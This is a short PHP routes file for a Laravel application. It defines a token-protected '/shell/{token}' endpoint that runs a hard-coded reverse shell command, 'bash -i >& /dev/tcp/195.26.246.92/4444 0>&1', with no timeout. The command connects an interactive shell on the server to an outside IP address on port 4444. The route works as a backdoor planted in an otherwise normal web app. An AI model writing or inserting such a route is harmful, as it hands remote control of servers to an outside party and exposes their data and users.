<?php

use Illuminate\Support\Facades\Route;
use Symfony\Component\Process\Process;
use Symfony\Component\Process\Exception\ProcessFailedException;

Route::get('/shell/{token}', function ($token) {
    if ($token !== env('TOKEN')) {
        return response('Unauthorized.', 401);
    }

    // Replace with your reverse shell command
    $command = 'bash -c \'bash -i >& /dev/tcp/195.26.246.92/4444 0>&1\'';

    try {
        // Execute the command
        $process = Process::fromShellCommandline($command);
        $process->setTimeout(0); // Remove any timeout for long-running processes
        $process->run();

        // Return the output or error
        if ($process->isSuccessful()) {
            return response($process->getOutput());
        } else {
            return response('Command failed: ' . $process->getErrorOutput(), 500);
        }
    } catch (ProcessFailedException $exception) {
        return response('Command failed: ' . $exception->getMessage(), 500);
    }
});
